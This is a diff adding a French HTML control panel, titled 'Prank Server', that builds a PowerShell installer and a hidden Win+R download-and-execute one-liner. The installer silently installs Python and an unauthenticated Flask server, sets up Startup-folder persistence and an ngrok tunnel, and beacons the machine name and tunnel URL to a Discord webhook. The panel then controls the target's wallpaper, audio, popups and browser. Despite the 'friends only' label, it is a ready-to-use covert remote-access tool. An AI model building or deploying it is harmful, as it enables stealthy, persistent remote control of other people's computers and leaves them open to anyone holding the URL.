@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Prank Server</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:       #0f0f17;
+      --surface:  #1a1a2e;
+      --card:     #16213e;
+      --border:   #2a2a4a;
+      --accent:   #e94560;
+      --accent2:  #0f3460;
+      --green:    #22c55e;
+      --green-dim:#052e16;
+      --text:     #e2e8f0;
+      --muted:    #64748b;
+      --ok:       #22c55e;
+      --err:      #ef4444;
+      --radius:   12px;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      min-height: 100vh;
+      padding: 2rem 1rem 4rem;
+    }
+
+    header {
+      text-align: center;
+      margin-bottom: 2.5rem;
+    }
+    header h1 { font-size: 2rem; font-weight: 800; letter-spacing: -0.5px; }
+    header h1 span { color: var(--accent); }
+    header p { color: var(--muted); margin-top: .4rem; font-size: .9rem; }
+
+    /* ── Section titles ── */
+    .section-title {
+      max-width: 1100px;
+      margin: 0 auto 1rem;
+      font-size: .7rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: .12em;
+      color: var(--muted);
+      padding-left: .2rem;
+    }
+
+    .divider {
+      max-width: 1100px;
+      margin: 2.5rem auto;
+      border: none;
+      border-top: 1px solid var(--border);
+    }
+
+    /* ── Generator box ── */
+    .generator-box {
+      max-width: 1100px;
+      margin: 0 auto 1rem;
+      background: var(--green-dim);
+      border: 1px solid #166534;
+      border-radius: var(--radius);
+      padding: 1.5rem;
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr auto;
+      gap: 1rem;
+      align-items: end;
+    }
+    @media (max-width: 760px) {
+      .generator-box { grid-template-columns: 1fr; }
+    }
+    .generator-box .field label { color: #86efac; }
+
+    .cmd-box {
+      max-width: 1100px;
+      margin: 0 auto 2.5rem;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1rem 1.25rem;
+      display: flex;
+      align-items: center;
+      gap: .75rem;
+    }
+    .cmd-box code {
+      flex: 1;
+      font-family: 'Consolas', monospace;
+      font-size: .8rem;
+      color: #93c5fd;
+      word-break: break-all;
+    }
+    .cmd-box.ready { border-color: #166534; }
+    .cmd-box.ready code { color: #86efac; }
+
+    /* ── Target URL ── */
+    .target-box {
+      max-width: 1100px;
+      margin: 0 auto 2rem;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.25rem 1.5rem;
+    }
+    .target-box > label {
+      display: block;
+      font-size: .75rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: .08em;
+      color: var(--muted);
+      margin-bottom: .5rem;
+    }
+    .target-row { display: flex; gap: .5rem; }
+    .target-row input {
+      flex: 1;
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      color: var(--text);
+      padding: .6rem .9rem;
+      font-size: .95rem;
+      outline: none;
+      transition: border-color .2s;
+    }
+    .target-row input:focus { border-color: var(--accent); }
+    .target-row input::placeholder { color: var(--muted); }
+
+    .ping-dot {
+      width: 10px; height: 10px;
+      border-radius: 50%;
+      background: var(--muted);
+      flex-shrink: 0;
+      align-self: center;
+      transition: background .3s;
+    }
+    .ping-dot.ok  { background: var(--ok); box-shadow: 0 0 6px var(--ok); }
+    .ping-dot.err { background: var(--err); }
+
+    /* ── Grid ── */
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+      gap: 1.25rem;
+      max-width: 1100px;
+      margin: 0 auto;
+    }
+
+    /* ── Card ── */
+    .card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.5rem;
+      display: flex;
+      flex-direction: column;
+      gap: .9rem;
+    }
+    .card-header { display: flex; align-items: center; gap: .6rem; }
+    .card-icon {
+      width: 36px; height: 36px;
+      border-radius: 8px;
+      background: var(--accent2);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 1.1rem;
+    }
+    .card-title { font-weight: 700; font-size: 1rem; }
+    .card-desc { font-size: .8rem; color: var(--muted); }
+
+    /* ── Form elements ── */
+    .field { display: flex; flex-direction: column; gap: .3rem; }
+    .field label {
+      font-size: .75rem; color: var(--muted);
+      font-weight: 600; text-transform: uppercase; letter-spacing: .06em;
+    }
+
+    input[type="text"],
+    input[type="url"],
+    input[type="password"],
+    textarea {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      color: var(--text);
+      padding: .55rem .8rem;
+      font-size: .9rem;
+      outline: none;
+      transition: border-color .2s;
+      font-family: inherit;
+      width: 100%;
+    }
+    input:focus, textarea:focus { border-color: var(--accent); }
+    input::placeholder, textarea::placeholder { color: var(--muted); }
+    textarea { resize: vertical; min-height: 70px; }
+
+    /* File upload */
+    .file-label {
+      display: flex; align-items: center; gap: .6rem;
+      background: var(--surface);
+      border: 1px dashed var(--border);
+      border-radius: 8px;
+      padding: .7rem .9rem;
+      cursor: pointer;
+      font-size: .85rem; color: var(--muted);
+      transition: border-color .2s, color .2s;
+    }
+    .file-label:hover { border-color: var(--accent); color: var(--text); }
+    .file-label input[type="file"] { display: none; }
+    .file-name { font-size: .8rem; color: var(--text); margin-top: .2rem; }
+
+    /* Buttons */
+    .btn {
+      display: flex; align-items: center; justify-content: center; gap: .45rem;
+      background: var(--accent);
+      color: #fff; border: none; border-radius: 8px;
+      padding: .65rem 1.2rem;
+      font-size: .9rem; font-weight: 600;
+      cursor: pointer; transition: opacity .15s, transform .1s;
+      margin-top: auto; white-space: nowrap;
+    }
+    .btn:hover  { opacity: .88; }
+    .btn:active { transform: scale(.97); }
+    .btn:disabled { opacity: .4; cursor: not-allowed; transform: none; }
+    .btn.green { background: var(--green); color: #052e16; }
+
+    /* Toast */
+    #toast {
+      position: fixed; bottom: 1.5rem; left: 50%;
+      transform: translateX(-50%) translateY(100px);
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 10px; padding: .75rem 1.4rem;
+      font-size: .9rem; font-weight: 500;
+      opacity: 0; transition: opacity .25s, transform .25s;
+      z-index: 999; pointer-events: none; white-space: nowrap;
+    }
+    #toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+    #toast.ok  { border-color: var(--ok);  color: var(--ok); }
+    #toast.err { border-color: var(--err); color: var(--err); }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>Prank <span>Server</span></h1>
+  <p>Controle a distance — entre amis uniquement</p>
+</header>
+
+<!-- ── SECTION 1 : Generateur d'installateur ────────────────────────────── -->
+<p class="section-title">Generer l'installateur</p>
+
+<div class="generator-box">
+  <div class="field">
+    <label>Webhook Discord</label>
+    <input type="url" id="genWebhook" placeholder="https://discord.com/api/webhooks/..." />
+  </div>
+  <div class="field">
+    <label>Authtoken ngrok</label>
+    <input type="password" id="genToken" placeholder="2abc..." />
+  </div>
+  <div class="field">
+    <label>URL Raw du fichier heberge</label>
+    <input type="url" id="genHostUrl" placeholder="https://gist.githubusercontent.com/..." oninput="updateCmd()" />
+  </div>
+  <button class="btn green" onclick="generateInstaller()">Telecharger install.ps1</button>
+</div>
+
+<div class="cmd-box" id="cmdBox">
+  <code id="winrCmd">powershell -w h -ep bypass -c "iwr 'TON_URL_RAW' -UseBasicParsing | iex"</code>
+  <button class="btn" style="margin-top:0;padding:.5rem .9rem;font-size:.8rem" onclick="copyCmd()">Copier</button>
+</div>
+
+<hr class="divider" />
+
+<!-- ── SECTION 2 : Controle a distance ──────────────────────────────────── -->
+<p class="section-title">Controler une cible</p>
+
+<div class="target-box">
+  <label>URL de la cible (depuis Discord)</label>
+  <div class="target-row">
+    <input type="url" id="targetUrl" placeholder="https://xxxx-xx-xx-xx-xx.ngrok-free.app" />
+    <div class="ping-dot" id="pingDot" title="Statut de la connexion"></div>
+  </div>
+</div>
+
+<div class="grid">
+
+  <div class="card">
+    <div class="card-header">
+      <div class="card-icon">🖼️</div>
+      <div><div class="card-title">Fond d'ecran</div><div class="card-desc">Remplace le wallpaper</div></div>
+    </div>
+    <div class="field">
+      <label>Image (JPG, PNG, BMP)</label>
+      <label class="file-label" for="wallpaperFile">
+        📁 Choisir une image
+        <input type="file" id="wallpaperFile" accept="image/*" />
+      </label>
+      <span class="file-name" id="wallpaperName">Aucun fichier</span>
+    </div>
+    <button class="btn" onclick="sendWallpaper()">Envoyer</button>
+  </div>
+
+  <div class="card">
+    <div class="card-header">
+      <div class="card-icon">🔊</div>
+      <div><div class="card-title">Audio</div><div class="card-desc">Joue un son sur le PC cible</div></div>
+    </div>
+    <div class="field">
+      <label>Fichier audio (MP3, WAV, OGG)</label>
+      <label class="file-label" for="audioFile">
+        📁 Choisir un fichier
+        <input type="file" id="audioFile" accept="audio/*" />
+      </label>
+      <span class="file-name" id="audioName">Aucun fichier</span>
+    </div>
+    <button class="btn" onclick="sendAudio()">Envoyer</button>
+  </div>
+
+  <div class="card">
+    <div class="card-header">
+      <div class="card-icon">💬</div>
+      <div><div class="card-title">Popup</div><div class="card-desc">Affiche une boite de dialogue</div></div>
+    </div>
+    <div class="field">
+      <label>Titre</label>
+      <input type="text" id="popupTitle" placeholder="Titre du message" value="Salut !" />
+    </div>
+    <div class="field">
+      <label>Message</label>
+      <textarea id="popupMessage" placeholder="Ton message ici...">Tu t'es fait avoir !</textarea>
+    </div>
+    <button class="btn" onclick="sendPopup()">Envoyer</button>
+  </div>
+
+  <div class="card">
+    <div class="card-header">
+      <div class="card-icon">🌐</div>
+      <div><div class="card-title">Ouvrir une URL</div><div class="card-desc">Ouvre un site dans le navigateur</div></div>
+    </div>
+    <div class="field">
+      <label>URL a ouvrir</label>
+      <input type="url" id="openUrl" placeholder="https://example.com" />
+    </div>
+    <button class="btn" onclick="sendUrl()">Envoyer</button>
+  </div>
+
+</div>
+
+<div id="toast"></div>
+
+<!-- Template PS1 stocke ici pour eviter tout echappement JS -->
+<script type="text/x-ps1" id="ps1template">
+$WEBHOOK     = "%%WEBHOOK%%"
+$NGROK_TOKEN = "%%NGROK_TOKEN%%"
+
+$ErrorActionPreference = "SilentlyContinue"
+$ProgressPreference    = "SilentlyContinue"
+
+$INSTALL_DIR = "C:\prank"
+try {
+    New-Item -ItemType Directory -Force -Path $INSTALL_DIR -ErrorAction Stop | Out-Null
+} catch {
+    $INSTALL_DIR = "$env:LOCALAPPDATA\prank"
+    New-Item -ItemType Directory -Force -Path $INSTALL_DIR | Out-Null
+}
+
+if (-not (Get-Command python.exe -ErrorAction SilentlyContinue)) {
+    $setup = "$env:TEMP\py_setup.exe"
+    Invoke-WebRequest `
+        -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" `
+        -OutFile $setup -UseBasicParsing
+    Start-Process $setup `
+        -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_launcher=0" `
+        -Wait -NoNewWindow
+    $pyBase   = "$env:LOCALAPPDATA\Programs\Python\Python311"
+    $env:PATH = "$pyBase;$pyBase\Scripts;$env:PATH"
+}
+
+python -m pip install --upgrade pip --quiet --no-warn-script-location 2>$null
+python -m pip install flask flask-cors pygame requests pyngrok --quiet --no-warn-script-location 2>$null
+
+$serverPy = @'
+import os, json, threading, webbrowser, tempfile, time, ctypes, requests
+from flask import Flask, request, jsonify
+from flask_cors import CORS
+
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+app = Flask(__name__)
+CORS(app)
+
+with open(os.path.join(BASE_DIR, "config.json"), encoding="utf-8-sig") as f:
+    config = json.load(f)
+
+def _set_wallpaper(path):
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(path), 3)
+
+def _play_audio(path):
+    import pygame
+    pygame.mixer.init()
+    pygame.mixer.music.load(path)
+    pygame.mixer.music.play()
+    while pygame.mixer.music.get_busy():
+        time.sleep(0.1)
+    pygame.mixer.quit()
+    try: os.unlink(path)
+    except: pass
+
+def _show_popup(title, message):
+    import tkinter as tk
+    from tkinter import messagebox
+    root = tk.Tk(); root.withdraw()
+    root.wm_attributes("-topmost", True)
+    messagebox.showinfo(title, message, parent=root)
+    root.destroy()
+
+@app.route("/wallpaper", methods=["POST"])
+def wallpaper():
+    if "image" not in request.files:
+        return jsonify({"error": "champ image manquant"}), 400
+    f = request.files["image"]
+    ext = os.path.splitext(f.filename)[1].lower() or ".jpg"
+    dest = os.path.join(BASE_DIR, "wallpaper" + ext)
+    f.save(dest)
+    threading.Thread(target=_set_wallpaper, args=(dest,), daemon=True).start()
+    return jsonify({"status": "ok"})
+
+@app.route("/audio", methods=["POST"])
+def audio():
+    if "audio" not in request.files:
+        return jsonify({"error": "champ audio manquant"}), 400
+    f = request.files["audio"]
+    ext = os.path.splitext(f.filename)[1].lower() or ".mp3"
+    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=ext)
+    f.save(tmp.name); tmp.close()
+    threading.Thread(target=_play_audio, args=(tmp.name,), daemon=True).start()
+    return jsonify({"status": "ok"})
+
+@app.route("/popup", methods=["POST"])
+def popup():
+    data = request.get_json(silent=True)
+    if not data:
+        return jsonify({"error": "json invalide"}), 400
+    threading.Thread(
+        target=_show_popup,
+        args=(data.get("title", "Message"), data.get("message", "")),
+        daemon=True
+    ).start()
+    return jsonify({"status": "ok"})
+
+@app.route("/url", methods=["POST"])
+def open_url():
+    data = request.get_json(silent=True)
+    if not data:
+        return jsonify({"error": "json invalide"}), 400
+    url = data.get("url", "").strip()
+    if url:
+        threading.Thread(target=webbrowser.open, args=(url,), daemon=True).start()
+    return jsonify({"status": "ok"})
+
+def _send_discord(ngrok_url):
+    wh = config.get("webhook_url", "").strip()
+    if not wh:
+        return
+    try:
+        requests.post(wh, json={
+            "content": f"**{config['pseudo']}** est en ligne !\nURL : `{ngrok_url}`"
+        }, timeout=5)
+    except Exception:
+        pass
+
+def _start_tunnel():
+    from pyngrok import ngrok, conf as nc
+    token = config.get("ngrok_authtoken", "").strip()
+    if token:
+        nc.get_default().auth_token = token
+    return ngrok.connect(9999, "http").public_url
+
+if __name__ == "__main__":
+    try:
+        url = _start_tunnel()
+        _send_discord(url)
+    except Exception:
+        pass
+    app.run(host="0.0.0.0", port=9999, threaded=True)
+'@
+
+[System.IO.File]::WriteAllText(
+    "$INSTALL_DIR\server.py",
+    $serverPy,
+    [System.Text.UTF8Encoding]::new($false)
+)
+
+$cfgJson = ([ordered]@{
+    pseudo          = $env:COMPUTERNAME
+    webhook_url     = $WEBHOOK
+    ngrok_authtoken = $NGROK_TOKEN
+}) | ConvertTo-Json
+
+[System.IO.File]::WriteAllText(
+    "$INSTALL_DIR\config.json",
+    $cfgJson,
+    [System.Text.UTF8Encoding]::new($false)
+)
+
+$q          = [char]34
+$startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+$vbs = "Set sh = CreateObject(${q}WScript.Shell${q})`r`n" +
+       "sh.Run ${q}pythonw.exe ${q}${q}$INSTALL_DIR\server.py${q}${q}${q}, 0, False"
+[System.IO.File]::WriteAllText("$startupDir\prank_server.vbs", $vbs)
+
+$pw      = Get-Command pythonw.exe -ErrorAction SilentlyContinue
+$pythonw = if ($pw) { $pw.Source } else { "pythonw.exe" }
+Start-Process $pythonw -ArgumentList "`"$INSTALL_DIR\server.py`"" -WorkingDirectory $INSTALL_DIR
+</script>
+
+<script>
+  // ── Generateur d'installateur ────────────────────────────────────────────
+  function generateInstaller() {
+    const webhook = document.getElementById('genWebhook').value.trim();
+    const token   = document.getElementById('genToken').value.trim();
+    if (!webhook) { toast('Entre le webhook Discord.', 'err'); return; }
+    if (!token)   { toast('Entre le token ngrok.', 'err'); return; }
+
+    let ps1 = document.getElementById('ps1template').textContent.trim();
+    ps1 = ps1.replace('%%WEBHOOK%%', webhook).replace('%%NGROK_TOKEN%%', token);
+
+    const blob = new Blob([ps1], { type: 'text/plain;charset=utf-8' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'install.ps1';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(a.href);
+    toast('install.ps1 telecharge ! Heberge-le et colle l\'URL Raw ci-dessus.');
+  }
+
+  function updateCmd() {
+    const url  = document.getElementById('genHostUrl').value.trim();
+    const box  = document.getElementById('cmdBox');
+    const code = document.getElementById('winrCmd');
+    if (url) {
+      code.textContent = `powershell -w h -ep bypass -c "iwr '${url}' -UseBasicParsing | iex"`;
+      box.classList.add('ready');
+    } else {
+      code.textContent = `powershell -w h -ep bypass -c "iwr 'TON_URL_RAW' -UseBasicParsing | iex"`;
+      box.classList.remove('ready');
+    }
+  }
+
+  function copyCmd() {
+    const cmd = document.getElementById('winrCmd').textContent;
+    navigator.clipboard.writeText(cmd).then(() => toast('Commande Win+R copiee !'));
+  }
+
+  // ── File input labels ────────────────────────────────────────────────────
+  document.getElementById('wallpaperFile').addEventListener('change', e => {
+    document.getElementById('wallpaperName').textContent = e.target.files[0]?.name || 'Aucun fichier';
+  });
+  document.getElementById('audioFile').addEventListener('change', e => {
+    document.getElementById('audioName').textContent = e.target.files[0]?.name || 'Aucun fichier';
+  });
+
+  // ── Ping cible ───────────────────────────────────────────────────────────
+  let pingTimer;
+  document.getElementById('targetUrl').addEventListener('input', () => {
+    clearTimeout(pingTimer);
+    pingTimer = setTimeout(pingTarget, 600);
+  });
+
+  async function pingTarget() {
+    const dot = document.getElementById('pingDot');
+    const url = getTarget();
+    if (!url) { dot.className = 'ping-dot'; return; }
+    try {
+      await fetch(url + '/popup', { method: 'OPTIONS', mode: 'cors', signal: AbortSignal.timeout(4000) });
+      dot.className = 'ping-dot ok';
+    } catch {
+      dot.className = 'ping-dot err';
+    }
+  }
+
+  // ── Helpers ──────────────────────────────────────────────────────────────
+  function getTarget() {
+    return document.getElementById('targetUrl').value.trim().replace(/\/$/, '');
+  }
+
+  function toast(msg, type = 'ok') {
+    const el = document.getElementById('toast');
+    el.textContent = msg;
+    el.className = `show ${type}`;
+    clearTimeout(el._t);
+    el._t = setTimeout(() => el.className = '', 3500);
+  }
+
+  async function post(path, body, isFormData = false) {
+    const url = getTarget();
+    if (!url) { toast('Entre d\'abord l\'URL de la cible !', 'err'); return; }
+    const opts = { method: 'POST', body };
+    if (!isFormData) opts.headers = { 'Content-Type': 'application/json' };
+    try {
+      const r = await fetch(url + path, opts);
+      const json = await r.json();
+      if (r.ok) toast('OK !');
+      else toast('Erreur : ' + (json.error || r.status), 'err');
+    } catch {
+      toast('Impossible de joindre la cible.', 'err');
+    }
+  }
+
+  // ── Actions ──────────────────────────────────────────────────────────────
+  function sendWallpaper() {
+    const file = document.getElementById('wallpaperFile').files[0];
+    if (!file) { toast('Choisis une image d\'abord.', 'err'); return; }
+    const fd = new FormData(); fd.append('image', file);
+    post('/wallpaper', fd, true);
+  }
+
+  function sendAudio() {
+    const file = document.getElementById('audioFile').files[0];
+    if (!file) { toast('Choisis un fichier audio d\'abord.', 'err'); return; }
+    const fd = new FormData(); fd.append('audio', file);
+    post('/audio', fd, true);
+  }
+
+  function sendPopup() {
+    const title   = document.getElementById('popupTitle').value.trim();
+    const message = document.getElementById('popupMessage').value.trim();
+    if (!message) { toast('Entre un message.', 'err'); return; }
+    post('/popup', JSON.stringify({ title, message }));
+  }
+
+  function sendUrl() {
+    const url = document.getElementById('openUrl').value.trim();
+    if (!url) { toast('Entre une URL.', 'err'); return; }
+    post('/url', JSON.stringify({ url }));
+  }
+</script>
+</body>
+</html>
